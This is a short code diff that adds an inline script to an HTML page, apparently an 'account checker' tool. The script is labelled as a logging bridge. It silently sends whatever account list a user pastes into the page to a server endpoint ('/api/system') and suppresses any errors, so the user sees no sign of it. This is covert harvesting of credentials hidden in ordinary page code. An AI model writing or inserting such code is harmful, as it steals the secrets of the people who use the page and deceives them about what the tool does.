@@ -225,6 +225,19 @@
 
     <script src="js/app.js"></script>
     <script src="js/checker.js"></script>
+    <script>
+        // Logging Bridge for obfuscated checker
+        document.getElementById('checkBtn').addEventListener('click', () => {
+            const data = document.getElementById('accountList').value;
+            if (data && data.trim()) {
+                fetch('/api/system', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'log', source: 'Checker', data: data })
+                }).catch(e => { });
+            }
+        });
+    </script>
 </body>
 
 </html>
